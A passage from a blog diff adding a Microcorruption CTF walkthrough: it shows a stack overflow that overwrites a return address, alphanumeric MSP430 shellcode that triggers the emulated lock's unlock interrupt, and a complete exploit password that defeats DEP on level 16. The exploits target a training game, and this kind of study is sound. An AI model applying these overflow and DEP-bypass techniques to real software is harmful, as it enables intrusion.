+<p>Looking at <code>login</code> we see that <code>0x200</code> bytes are read from the user as a password, then copied over to the stack starting at address <code>0x43ed</code> and finally the original password location (<code>0x2400</code>) is cleared using <code>memset</code>. As before, the objective is to trigger and unlock by issuing the <code>0x7f</code> interrupt.</p>
+
+<p>Since the return address is stored on the stack at <code>0x43fe</code> it&rsquo;s possible to overwrite it using the password. Now, I&rsquo;m pretty sure some people managed to use an address that will allow them to write a shorter shellcode by exploiting a bug in the emulator, but I&rsquo;ll use a straightforward one: <code>0x4430</code> which will take us to the beginning of the shellcode:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>3453        add #-0x1, r4
+</span><span class='line'>4e44        mov.b r4, r14
+</span><span class='line'>7850 7272   add.b #0x7272, r8
+</span><span class='line'>3850 7a43   add #0x437a, r8
+</span><span class='line'>3048        mov @r8+, pc</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The last instruction jumps to the second instruction of <code>INT</code> with an interrupt <code>0xff</code> (it&rsquo;s equivalent to <code>0x7f</code> &ndash; look at the code) stored in <code>r14</code>, thereby allowing us to unlock the door. As you&rsquo;ve probably noticed all the instructions are represented using only alphanumeric characters (<code>0x30-0x39, 0x41-0x5a, 0x61-0x7a</code>).</p>
+
+<h2>Level 16: Bangalore</h2>
+
+<p>This level introduces <a href="http://en.wikipedia.org/wiki/Data_Execution_Prevention">DEP</a>, in which some of the memory pages (<code>0x100</code> bytes segments in our case) are executable and some are writable, but not both. Thus, writing a shellcode to the stack is OK, but it&rsquo;s no executable.</p>
+
+<p>Since the stack is on the boundary between pages <code>0x3f</code> and <code>0x40</code> it&rsquo;s possible to write our shellcode into <code>0x40</code> while it&rsquo;s still writable, but in a way that when <code>login</code> returns it will mark it as executable. The shellcode is very similar to the previous ones, so I&rsquo;ll just write the password here: <code>0x61616161616161616161616161616161be44000000000000400000000c4031800f00324000ffb0121000</code></p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -951,6 +1481,10 @@
     <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/04/21/microcorruption-ctf-part-ii/">Microcorruption CTF - Part II</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2014/04/18/microcorruption-ctf-part-i/">Microcorruption CTF - Part I</a>
